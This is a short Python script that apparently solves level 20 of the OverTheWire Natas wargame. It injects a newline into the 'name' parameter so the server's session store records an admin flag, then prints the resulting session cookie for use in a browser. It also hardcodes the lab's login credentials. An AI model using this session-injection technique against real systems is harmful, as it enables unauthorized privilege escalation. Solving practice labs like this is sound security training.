import requests
from urllib.parse import quote

URL = 'http://natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF@natas20.natas.labs.overthewire.org/'        

def set_admin():
    s = requests.session()
    name = quote("admin\nadmin 1")
    s = s.get(f"{URL}?name={name}", cookies = {'hack': 'hack'})
    return s.cookies.get_dict()

if __name__ == '__main__':
    if requests.head(URL).status_code == requests.codes.ok:
        print(f'Cookie = {set_admin()}')
        # Now put in this session in Chrome-Dev and we are in  ^^
    else:
        print('Authentication Failed!')
